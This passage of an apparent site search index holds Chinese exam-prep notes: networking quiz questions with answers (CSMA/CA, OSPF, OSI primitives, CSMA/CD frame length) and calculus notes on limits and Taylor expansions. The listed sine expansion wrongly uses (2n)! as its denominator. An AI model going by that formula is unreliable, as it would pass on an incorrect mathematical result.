3. Week 4 # 3.1. Wed # 802.11\u6807\u51c6\u5b9a\u4e49\u7684\u5206\u5e03\u5f0f\u534f\u8c03\u529f\u80fd\u91c7\u7528\u4e86 \u534f\u8bae\u3002[\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] A\uff0eCSMA/CD B\uff0eCSMA/CA C\uff0eCDMA/CD D\uff0eCDMA/CA \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1aIEEE 802.11\u6807\u51c6\u5b9a\u4e49\u7684\u5206\u5e03\u5f0f\u534f\u8c03\u529f\u80fd\u91c7\u7528\u4e86\u8f7d\u6ce2\u76d1\u542c\u591a\u8def\u8bbf\u95ee/\u51b2\u7a81\u907f\u514d(CSMA/ CA\u534f\u8bae)\u3002\u5728\u65e0\u7ebf\u7f51\u4e2d\u8fdb\u884c\u51b2\u7a81\u68c0\u6d4b\u662f\u6709\u56f0\u96be\u7684\u3002\u4f8b\u5982\uff0c\u4e24\u4e2a\u7ad9\u7531\u4e8e\u8ddd\u79bb\u8fc7\u5927\u6216\u4e2d\u95f4\u969c\u788d\u7269\u7684\u5206\u9694\u800c\u68c0\u6d4b\u4e0d\u5230\u51b2\u7a81\uff0c\u4f46\u662f\u4f4d\u4e8e\u5b83\u4eec\u4e4b\u95f4\u7684\u7b2c\u4e09\u4e2a\u7ad9\u53ef\u80fd\u4f1a\u68c0\u6d4b\u5230\u51b2\u7a81\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u9690\u853d\u7ec8\u7aef\u95ee\u9898\u3002\u91c7\u7528\u51b2\u7a81\u907f\u514d\u7684\u529e\u6cd5\u53ef\u4ee5\u89e3\u51b3\u9690\u853d\u7ec8\u7aef\u7684\u95ee\u9898\u3002 3.2. Sun # \u5728\u4e00\u4e2a\u91c7\u7528 CSMA/CD \u534f\u8bae\u7684\u7f51\u7edc\u4e2d\uff0c\u4f20\u8f93\u4ecb\u8d28\u662f \u4e00\u6839\u5b8c\u6574\u7684\u7535\u7f06\uff0c\u4f20\u8f93\u901f\u7387\u4e3a 1Gbps \uff0c\u7535\u7f06\u4e2d\u7684\u4fe1\u53f7\u4f20\u64ad\u901f\u5ea6\u662f 200 000km/s. \u82e5\u6700\u5c0f\u6570\u636e\u5e27\u957f\u5ea6\u51cf\u5c11 800 \u6bd4\u7279\uff0c\u5219\u6700\u8fdc\u7684\u4e24\u4e2a\u7ad9\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u81f3\u5c11\u9700\u8981 [\u91cd\u5e86\u90ae\u7535\u5927\u5b66] A.\u589e\u52a0 160m B.\u589e\u52a0 80m C.\u51cf\u5c11 160m D.\u51cf\u5c11 80m \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u8bbe \u4f20\u8f93 \u4ecb \u8d28 \u957f \u5ea6 \u4e3a d(m) \uff0c \u539f \u6700 \u5c0f \u5e27 \u957f\u4e3a M \uff0c \u5219 M=2*(d/200000000)*1Gbps \uff0c\u5f97 M=10d\u3002\u6240\u4ee5\u6700\u5c0f\u6570\u636e\u5e27\u957f\u5ea6\u51cf\u5c11 800 \u6bd4\u7279\uff0c \u6700\u8fdc\u7684\u4e24\u4e2a\u7ad9\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u81f3\u5c11\u9700\u8981\u51cf\u5c11 80m\u3002","title":"2020 Sep"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#2020-sep","text":"","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 Sep"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#_1","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 Sep \u76ee\u5f55 1. Week 3 1.1. Wed 2. Week 4 2.1. Wed 3. Week 4 3.1. Wed 3.2. Sun","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#1-week-3","text":"","title":"1. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#11-wed","text":"\u5f00\u653e\u6700\u77ed\u8def\u5f84\u4f18\u5148\u534f\u8bae(OSPF)\u91c7\u7528______\u7b97\u6cd5\u8ba1\u7b97\u6700\u4f73\u8def\u7531\u3002[\u897f\u5b89\u7535\u5b50\u79d1\u6280\u5927\u5b66952-2017] A\uff0eDynamic-Search B\uff0eBellman-Ford C\uff0eDijkstra D\uff0eSpanning-Tree \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aOSPF\u662f\u4e00\u79cd\u57fa\u4e8eDiikstra\u7b97\u6cd5\u7684\u94fe\u8def\u72b6\u6001\u534f\u8bae\uff0c\u8fd9\u79cd\u534f\u8bae\u8981\u6c42\u8def\u7531\u5668\u638c\u63e1\u5b8c\u6574\u7684\u7f51\u7edc\u62d3\u6251\u7ed3\u6784\uff0c\u5e76\u636e\u6b64\u8ba1\u7b97\u51fa\u5230\u8fbe\u76ee\u6807\u7684\u6700\u4f73\u8def\u7531\u3002\u8be5\u7b97\u6cd5\u7684\u57fa\u672c\u601d\u60f3\u662f\uff1a\u4e92\u8054\u7f51\u4e0a\u7684\u6bcf\u4e2a\u8def\u7531\u5668\u5468\u671f\u6027\u5730\u5411\u5176\u4ed6\u8def\u7531\u5668\u5e7f\u64ad\u81ea\u5df1\u4e0e\u76f8\u90bb\u8def\u7531\u5668\u7684\u8fde\u63a5\u5173\u7cfb\uff0c\u5229\u7528\u5176\u4ed6\u8def\u7531\u5668\u7684\u5e7f\u64ad\u4fe1\u606f\uff0c\u4e92\u8054\u7f51\u4e0a\u7684\u6bcf\u4e2a\u8def\u7531\u5668\u90fd\u53ef\u4ee5\u5f62\u6210\u4e00\u5f20\u7531\u70b9\u548c\u7ebf\u8fde\u63a5\u800c\u6210\u7684\u62bd\u8c61\u62d3\u6251\u7ed3\u6784\u56fe\uff1b\u4e00\u65e6\u5f97\u5230\u4e86\u8fd9\u5f20\u56fe\uff0c\u8def\u7531\u5668\u5c31\u53ef\u4ee5\u6309\u7167Dijkstra\u7b97\u6cd5\u8ba1\u7b97\u51fa\u4ee5\u672c\u5730\u8def\u7531\u5668\u4e3a\u6839\u7684SPF\u6811\uff0c\u901a\u8fc7\u8fd9\u68f5\u6811\u8def\u7531\u5668\u5c31\u53ef\u4ee5\u751f\u6210\u81ea\u5df1\u7684\u8def\u7531\u8868\u3002","title":"1.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#2-week-4","text":"","title":"2. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#21-wed","text":"IS0\u4e3a\u4f20\u8f93\u5c42\u5b9a\u4e49\u4e864\u79cd\u7c7b\u578b\u7684\u670d\u52a1\u539f\u8bed\uff0c\u7531\u4f20\u8f93\u670d\u52a1\u7528\u6237\u4ea7\u751f\u7684\u539f\u8bed\u662f [\u897f\u5b89\u7535\u5b50\u79d1\u6280\u5927\u5b66952] A\uff0e\u8bf7\u6c42\u539f\u8bed\uff0c\u6307\u793a\u539f\u8bed B\uff0e\u8bf7\u6c42\u539f\u8bed\uff0c\u54cd\u5e94\u539f\u8bed C\uff0e\u6307\u793a\u539f\u8bed\uff0c\u786e\u8ba4\u539f\u8bed D\uff0e\u54cd\u5e94\u539f\u8bed\uff0c\u786e\u8ba4\u539f\u8bed \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u5728OSI\u53c2\u8003\u6a21\u578b\u4e2d\uff0c4\u4e2a\u57fa\u672c\u7684\u5c42\u95f4\u670d\u52a1\u539f\u8bed\u662f\u8bf7\u6c42(Request)\u3001\u6307\u793a(Indication)\u3001\u54cd\u5e94(Response)\u548c\u8bc1\u5b9e(Confirm)\u3002 \u8bf7\u6c42(Request)\uff1a\u547c\u53eb\u8bf7\u6c42\u5efa\u7acb\u8fde\u63a5\u3002 \u6307\u793a(Indication)\uff1a\u6307\u793a\u6709\u4eba\u8bf7\u6c42\u5efa\u7acb\u8fde\u63a5\u3002 \u54cd\u5e94(Response)\uff1a\u88ab\u547c\u53eb\u65b9\u7528\u6765\u8868\u793a\u63a5\u53d7/\u62d2\u7edd\u5efa\u7acb\u8fde\u63a5\u8bf7\u6c42\u3002 \u8bc1\u5b9e(Confirm)\uff1a\u901a\u77e5\u547c\u53eb\u65b9\u5efa\u7acb\u8fde\u63a5\u8bf7\u6c42\u662f\u5426\u88ab\u63a5\u53d7\u3002 \u4f20\u8f93\u5c42\u4ea7\u751f\u7684\u539f\u8bed\u662f\u8bf7\u6c42\u548c\u54cd\u5e94\u3002","title":"2.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#3-week-4","text":"","title":"3. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#31-wed","text":"802.11\u6807\u51c6\u5b9a\u4e49\u7684\u5206\u5e03\u5f0f\u534f\u8c03\u529f\u80fd\u91c7\u7528\u4e86 \u534f\u8bae\u3002[\u91cd\u5e86\u90ae\u7535\u5927\u5b66803] A\uff0eCSMA/CD B\uff0eCSMA/CA C\uff0eCDMA/CD D\uff0eCDMA/CA \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1aIEEE 802.11\u6807\u51c6\u5b9a\u4e49\u7684\u5206\u5e03\u5f0f\u534f\u8c03\u529f\u80fd\u91c7\u7528\u4e86\u8f7d\u6ce2\u76d1\u542c\u591a\u8def\u8bbf\u95ee/\u51b2\u7a81\u907f\u514d(CSMA/ CA\u534f\u8bae)\u3002\u5728\u65e0\u7ebf\u7f51\u4e2d\u8fdb\u884c\u51b2\u7a81\u68c0\u6d4b\u662f\u6709\u56f0\u96be\u7684\u3002\u4f8b\u5982\uff0c\u4e24\u4e2a\u7ad9\u7531\u4e8e\u8ddd\u79bb\u8fc7\u5927\u6216\u4e2d\u95f4\u969c\u788d\u7269\u7684\u5206\u9694\u800c\u68c0\u6d4b\u4e0d\u5230\u51b2\u7a81\uff0c\u4f46\u662f\u4f4d\u4e8e\u5b83\u4eec\u4e4b\u95f4\u7684\u7b2c\u4e09\u4e2a\u7ad9\u53ef\u80fd\u4f1a\u68c0\u6d4b\u5230\u51b2\u7a81\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u9690\u853d\u7ec8\u7aef\u95ee\u9898\u3002\u91c7\u7528\u51b2\u7a81\u907f\u514d\u7684\u529e\u6cd5\u53ef\u4ee5\u89e3\u51b3\u9690\u853d\u7ec8\u7aef\u7684\u95ee\u9898\u3002","title":"3.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#32-sun","text":"\u5728\u4e00\u4e2a\u91c7\u7528 CSMA/CD \u534f\u8bae\u7684\u7f51\u7edc\u4e2d\uff0c\u4f20\u8f93\u4ecb\u8d28\u662f \u4e00\u6839\u5b8c\u6574\u7684\u7535\u7f06\uff0c\u4f20\u8f93\u901f\u7387\u4e3a 1Gbps \uff0c\u7535\u7f06\u4e2d\u7684\u4fe1\u53f7\u4f20\u64ad\u901f\u5ea6\u662f 200 000km/s. \u82e5\u6700\u5c0f\u6570\u636e\u5e27\u957f\u5ea6\u51cf\u5c11 800 \u6bd4\u7279\uff0c\u5219\u6700\u8fdc\u7684\u4e24\u4e2a\u7ad9\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u81f3\u5c11\u9700\u8981 [\u91cd\u5e86\u90ae\u7535\u5927\u5b66] A.\u589e\u52a0 160m B.\u589e\u52a0 80m C.\u51cf\u5c11 160m D.\u51cf\u5c11 80m \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u8bbe \u4f20\u8f93 \u4ecb \u8d28 \u957f \u5ea6 \u4e3a d(m) \uff0c \u539f \u6700 \u5c0f \u5e27 \u957f\u4e3a M \uff0c \u5219 M=2*(d/200000000)*1Gbps \uff0c\u5f97 M=10d\u3002\u6240\u4ee5\u6700\u5c0f\u6570\u636e\u5e27\u957f\u5ea6\u51cf\u5c11 800 \u6bd4\u7279\uff0c \u6700\u8fdc\u7684\u4e24\u4e2a\u7ad9\u70b9\u4e4b\u95f4\u7684\u8ddd\u79bb\u81f3\u5c11\u9700\u8981\u51cf\u5c11 80m\u3002","title":"3.2. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E5%87%BD%E6%95%B0_%E6%9E%81%E9%99%90_%E8%BF%9E%E7%BB%AD/","text":"\u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed # \u76ee\u5f55 # \u7b2c\u4e00\u7ae0 \u51fd\u6570 \u6781\u9650 \u8fde\u7eed \u76ee\u5f55 1. \u80cc\u666f 2. \u6781\u9650\u7684\u5b58\u5728\u51c6\u5219 2.1. \u5939\u903c\u51c6\u5219 2.2. \u5355\u8c03\u6709\u754c\u51c6\u5219 3. \u5e38\u7528\u7684\u6c42\u6781\u9650\u65b9\u6cd5\uff088\u79cd\uff09 3.1. \u65b9\u6cd51 \u7528\u57fa\u672c\u6781\u9650\u6c42\u6781\u9650 3.2. \u65b9\u6cd52 \u5229\u7528\u7b49\u4ef7\u65e0\u7a77\u5c0f\u4ee3\u6362 3.3. \u65b9\u6cd53 \u5229\u7528\u6709\u7406\u8fd0\u7b97\u6cd5\u5219\u6c42\u6781\u9650 3.4. \u65b9\u6cd54 \u5229\u7528\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u6c42\u6781\u9650 3.5. \u65b9\u6cd55 \u5229\u7528\u6cf0\u52d2\u516c\u5f0f\u6c42\u6781\u9650 3.6. \u65b9\u6cd56 \u5229\u7528\u5939\u903c\u539f\u7406\u6c42\u6781\u9650 3.7. \u65b9\u6cd57 \u5229\u7528\u5355\u8c03\u6709\u754c\u51c6\u5219\u6c42\u6781\u9650 3.8. \u65b9\u6cd58 \u5229\u7528\u5b9a\u79ef\u5206\u5b9a\u4e49\u6c42\u6781\u9650\uff08\u89c1\u7b2c\u4e94\u7ae0\uff09 4. \u51fd\u6570\u7684\u8fde\u7eed\u6027 4.1. \u8fde\u7eed\u7684\u5b9a\u4e49 4.2. \u95f4\u65ad\u70b9\u7684\u5206\u7c7b 4.3. \u95ed\u533a\u95f4\u4e0a\u8fde\u7eed\u51fd\u6570\u7684\u6027\u8d28 5. \u603b\u7ed3 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u590d\u4e60\u5b8c\u4e86\u9ad8\u6570\u7b2c\u4e00\u7ae0\u7684\u5185\u5bb9\uff0c\u6211\u53c2\u8003\u300a\u590d\u4e60\u5168\u4e66\u00b7\u57fa\u7840\u7bc7\u300b\u548c\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u5bf9\u8fd9\u4e00\u7ae0\u7684\u77e5\u8bc6\u70b9\u8fdb\u884c\u4e86\u6574\u7406\uff0c\u5f62\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\uff0c\u65b9\u4fbf\u5728\u79fb\u52a8\u8bbe\u5907\u4e0a\u8fdb\u884c\u8bbf\u95ee\u548c\u540e\u7eed\u7684\u8865\u5145\u4fee\u6539\u3002 2. \u6781\u9650\u7684\u5b58\u5728\u51c6\u5219 # 2.1. \u5939\u903c\u51c6\u5219 # \u82e5\u5b58\u5728 N \uff0c\u5f53 n>N \u65f6\uff0c x_n \\leq y_n \\leq z_n \uff0c\u4e14 \\lim\\limits_{{n\\to \\infty }}{x_n} = \\lim\\limits_{{n\\to \\infty }}{z_n} = a \uff0c\u5219 \\lim\\limits_{{n\\to \\infty }}{y_n} = a . 2.2. \u5355\u8c03\u6709\u754c\u51c6\u5219 # \u5355\u8c03\u6709\u754c\u51fd\u6570\u5fc5\u6709\u6781\u9650\uff0c\u5373 \u5355\u8c03 \u589e\uff08\u51cf\uff09\u6709\u4e0a\uff08\u4e0b\uff09\u754c\u7684\u51fd\u6570\u5fc5\u6709\u6781\u9650\u3002 3. \u5e38\u7528\u7684\u6c42\u6781\u9650\u65b9\u6cd5\uff088\u79cd\uff09 # 3.1. \u65b9\u6cd51 \u7528\u57fa\u672c\u6781\u9650\u6c42\u6781\u9650 # \u5e38\u7528\u7684\u57fa\u672c\u6781\u9650 \\lim_{{x\\to 0 }}{\\sin x\\over{x}} = 1 \\tag{1.1} \\lim_{{x\\to 0 }}{(1+x)^{1\\over{x}}} = e \\tag{1.2} \\lim_{{x\\to \\infty }}{(1+{1\\over{x}})^x} = e \\tag{1.3} \\lim_{{x\\to 0 }}{{a^x - 1}\\over{x}} = \\ln{a} \\tag{1.4} \\lim_{{n\\to \\infty }}{\\sqrt[{n}]{{n}}} = 1 \\tag{1.5} \\lim_{{n\\to \\infty }}{\\sqrt[{n}]{{a}}} = 1,(a>0) \\tag{1.6} \\lim_{{x\\to \\infty }}{{{a_nx^n + a_{n-1}x^{n-1}} + \\cdots + a_1x + a_0 }\\over{{b_nx^n + b_{n-1}x^{n-1}} + \\cdots + b_1x + b_0}} = { \\left\\{ \\begin{aligned} &{a_n\\over{b_m}}, &n=m\\\\ &{0}, &n<m\\\\ &{\\infty} , &n>m\\\\ \\end{aligned}\\right. } \\tag{1.7} \u6ce8\uff1a\u8d8b\u5411\u4e8e\u65e0\u7a77\u65f6\u770b\u9ad8\u6b21\u9879\uff0c\u8d8b\u5411\u4e8e0\u65f6\u770b\u4f4e\u6b21\u9879 \u201c 1^{\\infty} \u201d \u578b\u6781\u9650\u5e38\u7528\u7ed3\u8bba \u82e5 \\lim a(x) = 0, \\lim \\beta(x) = \\infty \uff0c\u4e14 \\lim \\alpha(x)\\beta(x) = A \uff0c\u5219 \\lim[1 + \\alpha(x)]^{\\beta(x)} = e^A \u53ef\u4ee5\u5f52\u7eb3\u4e3a\u4ee5\u4e0b\u4e09\u6b65\uff1a \u5199\u6807\u51c6\u5f62\u5f0f\uff1a\u539f\u5f0f =\\lim[1 + \\alpha(x)]^{\\beta(x)} \uff1b \u6c42\u6781\u9650\uff1a \\lim\\alpha(x)\\beta(x) = A \uff1b \u5199\u7ed3\u679c\uff1a\u539f\u5f0f =e^A . 3.2. \u65b9\u6cd52 \u5229\u7528\u7b49\u4ef7\u65e0\u7a77\u5c0f\u4ee3\u6362 # \u5e38\u7528\u7684\u7b49\u4ef7\u65e0\u7a77\u5c0f \u5f53 x\\to 0 \u65f6 x\\sim \\sin x \\sim \\tan x \\sim \\arcsin x \\sim \\ln(1+x) \\sim e ^ x - 1 \\tag{1.8} (1 + x) ^ \\alpha - 1\\sim \\alpha x \\tag{1.9} a^x - 1 \\sim x\\ln a \\tag{1.10} 1 - \\cos x \\sim {1\\over{2}} x ^ 2 \\tag{1.11} x - \\ln(1+x) \\sim {1\\over{2}} x^2 \\tag{1.12} \\tan x - x \\sim {1\\over{3}} x^3 \\tag{1.13} x - \\arctan x \\sim {1\\over{3}} x^3 \\tag{1.14} x - sin x \\sim {1\\over{6}} x^3 \\tag{1.15} \\arcsin x - x \\sim {1\\over{6}} x^3 \\tag{1.16} \u8bc1\u660e\uff081.8-1.16\uff09 \u5e38\u7528\u7684\u7b49\u4ef7\u65e0\u7a77\u5c0f\u90fd\u53ef\u4ee5\u7528\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u8bc1\u660e \u63a8\u8bba 1 - \\cos^\\alpha x \\sim {\\alpha\\over{2}}x^2 \\tag{1.17} \u8bc1\u660e\uff081.17\uff09 {1 - [1 + (\\cos x - 1)]^ \\alpha} \\sim \\alpha(1 - \\cos x) \\sim {\\alpha\\over{2}}x^2 3.3. \u65b9\u6cd53 \u5229\u7528\u6709\u7406\u8fd0\u7b97\u6cd5\u5219\u6c42\u6781\u9650 # 3.4. \u65b9\u6cd54 \u5229\u7528\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u6c42\u6781\u9650 # \u4f7f\u7528\u6761\u4ef6 \u82e5 f(x)n \u9636 \u53ef\u5bfc \u5219\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u53ef\u4f7f\u7528\u81f3\u6c42\u51fa f^{(n-1)}(x) \uff0c\u5373 f(x) \u7684 n-1 \u9636\u5bfc\u6570 \u82e5 f(x) \u6709 n \u9636 \u8fde\u7eed\u5bfc\u6570 \u5219\u6d1b\u5fc5\u8fbe\u6cd5\u5219\u53ef\u4f7f\u7528\u81f3\u6c42\u51fa f^{(n)}(x) \uff0c\u5373 f(x) \u7684 n \u9636\u5bfc\u6570 \u82e5 f(x)n \u9636 \u53ef\u5bfc \uff0c\u4e14\u6c42\u51fa f^{(n-1)}(x) \u540e\u6781\u9650\u4ecd\u4e3a \\frac{0}{0} \u578b \u5219\u8003\u8651\u4f7f\u7528 \u7b49\u4ef7\u65e0\u7a77\u5c0f \u6216 \u5bfc\u6570\u5b9a\u4e49 3.5. \u65b9\u6cd55 \u5229\u7528\u6cf0\u52d2\u516c\u5f0f\u6c42\u6781\u9650 # \u5b9a\u7406 \uff08\u5e26Peano\u4f59\u9879\u7684\u6cf0\u52d2\u516c\u5f0f\uff09 \u8bbe f(x) \u5728 x = x_0 \u5904 n \u9636\u53ef\u5bfc\uff0c\u5219 f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) }{\\mathop{{ \\left( {x-\\mathop{{x}}\\nolimits_{{0}}} \\right) }}\\nolimits^{{n}}} + o[(x - x_0)^n],x \\in U{ \\left( {\\mathop{{x}}\\nolimits_{{0}}} \\right) } \\tag{1.18} \u7279\u522b\u662f\u5f53 x_0=0 \u65f6\uff0c\u4e3a\u9ea6\u514b\u52b3\u6797\u516c\u5f0f f{ \\left( {x} \\right) }=\\mathop{ \\sum }\\limits_{{n=0}}^{{ \\infty }}\\frac{{1}}{{n!}}\\mathop{{f}}\\nolimits^{{(n)}}{ \\left( {0} \\right) }{\\mathop{{x}}\\nolimits^{{n}}} + o(x^n),x \\in U{ \\left( {0} \\right) } \\tag{1.19} \u51e0\u4e2a\u5e38\u7528\u7684\u6cf0\u52d2\u516c\u5f0f e^x = 1 + x + {x^2\\over{2!}} + \\cdots + {x^n\\over{n!}} + o(x^n) \\tag{1.20} \\sin(x) = x - {x^3\\over{3!}} + \\cdots + (-1)^{n-1}{{x^{2n-1}}\\over{(2n)!}} + o(x^{2n-1}) \\tag{1.21} \\cos(x) = 1 - {x^2\\over{2!}} + \\cdots + (-1)^{n}{{x^{2n}}\\over{(2n)!}} + o(x^{2n}) \\tag{1.22} \\ln(1 + x) = x - {x^2\\over{2}} + \\cdots + (-1)^{n-1}{{x^{n}\\over{n}}} + o(x^{n}) \\tag{1.23} (1 + x) ^ \\alpha = 1 + \\alpha x + {\\alpha (\\alpha - 1)\\over{2!} }x^2 + \\cdots + {[\\alpha!/(\\alpha - n)!]\\over{n!}}x^n + o(x^n) \\tag{1.24} 3.6. \u65b9\u6cd56 \u5229\u7528\u5939\u903c\u539f\u7406\u6c42\u6781\u9650 # \u5e38\u7528\u7ed3\u8bba \\lim\\limits_{{n\\to \\infty }}{\\sqrt[{n}]{{a_1^n + a_2^n + \\cdots + a_m^n}}} = max\\{a_i\\} \\tag{1.25} \u5176\u4e2d a_i > 0, (i = 1, 2, \\cdots, m) \u8bc1\u660e\u516c\u5f0f1.25 \u4ee4 max\\{a_i\\} = a \uff0c\u5219 \\sqrt[n]{a^n} < {\\sqrt[{n}]{{a_1^n + a_2^n + \\cdots + a_m^n}}} < \\sqrt[n]{ma^n} \\lim\\limits_{{n\\to \\infty }}{\\sqrt[{n}]{{a^n}}} = a \\lim\\limits_{{n\\to \\infty }}{\\sqrt[{n}]{{ma^n}}} = a \u6839\u636e\u5939\u903c\u51c6\u5219 \\lim\\limits_{{n\\to \\infty }}{\\sqrt[{n}]{{a_1^n + a_2^n + \\cdots + a_m^n}}} = max\\{a_i\\} \\tag{1.26} 3.7. \u65b9\u6cd57 \u5229\u7528\u5355\u8c03\u6709\u754c\u51c6\u5219\u6c42\u6781\u9650 # \u57fa\u672c\u4e0d\u7b49\u5f0f {2\\over{{1\\over{a}} + {1\\over{b}}}} \\leq \\sqrt{ab} \\leq \\frac{a + b}{2} \\leq \\sqrt{\\frac{a ^ 2 + b ^ 2}{2}} 3.8. \u65b9\u6cd58 \u5229\u7528\u5b9a\u79ef\u5206\u5b9a\u4e49\u6c42\u6781\u9650\uff08\u89c1\u7b2c\u4e94\u7ae0\uff09 # 4. \u51fd\u6570\u7684\u8fde\u7eed\u6027 # 4.1. \u8fde\u7eed\u7684\u5b9a\u4e49 # \u8fde\u7eed\u7684\u5b9a\u4e49 \u8bbe y=f(x) \u5728\u70b9 x_0 \u7684\u67d0\u9886\u57df\u5185\u6709\u5b9a\u4e49\uff0c\u82e5 \\lim\\limits_{x \\to x_0}{f(x) = f(x_0)} \u5219\u79f0 f(x) \u5728\u70b9 x_0 \u5904\u8fde\u7eed\u3002 \u5de6\u8fde\u7eed\u7684\u5b9a\u4e49 \u82e5 \\lim\\limits_{x \\to x_0^-}{f(x)} = f(x_0) \uff0c\u5219\u79f0 y = f(x) \u5728\u70b9 x_0 \u5904\u5de6\u8fde\u7eed\u3002 \u53f3\u8fde\u7eed\u7684\u5b9a\u4e49 \u82e5 \\lim\\limits_{x \\to x_0^+}{f(x)} = f(x_0) \uff0c\u5219\u79f0 y = f(x) \u5728\u70b9 x_0 \u5904\u53f3\u8fde\u7eed\u3002 \u5b9a\u7406 \u51fd\u6570 f(x) \u5728\u70b9 x_0 \u5904\u8fde\u7eed\u7684\u5145\u8981\u6761\u4ef6\u662f f(x) \u5728\u70b9 x_0 \u65e2\u5de6\u8fde\u7eed\u53c8\u53f3\u8fde\u7eed\u3002 4.2. \u95f4\u65ad\u70b9\u7684\u5206\u7c7b # \u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u90fd\u5b58\u5728\u7684\u95f4\u65ad\u70b9\u6210\u4e3a\u7b2c\u4e00\u7c7b\u95f4\u65ad\u70b9 \u53ef\u53bb\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u90fd \u5b58\u5728 \u4e14 \u76f8\u7b49 \u7684\u95f4\u65ad\u70b9\u6210\u4e3a\u53ef\u53bb\u95f4\u65ad\u70b9 \u8df3\u8dc3\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u90fd \u5b58\u5728 \u4f46 \u4e0d\u76f8\u7b49 \u7684\u95f4\u65ad\u70b9\u6210\u4e3a\u8df3\u8dc3\u95f4\u65ad\u70b9 \u7b2c\u4e8c\u7c7b\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u5de6\u53f3\u6781\u9650\u81f3\u5c11\u6709\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u95f4\u65ad\u70b9\u79f0\u4e3a\u7b2c\u4e8c\u7c7b\u95f4\u65ad\u70b9 \u65e0\u7a77\u95f4\u65ad\u70b9 \u5b9a\u4e49\uff1a\u82e5 \\lim\\limits_{x \\to x_0^-} = \\infty \u6216 \\lim\\limits_{x \\to x_0^+} = \\infty \uff0c \u5219\u79f0 x_0 \u4e3a f(x) \u7684\u65e0\u7a77\u95f4\u65ad\u70b9 \u9707\u8361\u95f4\u65ad\u70b9 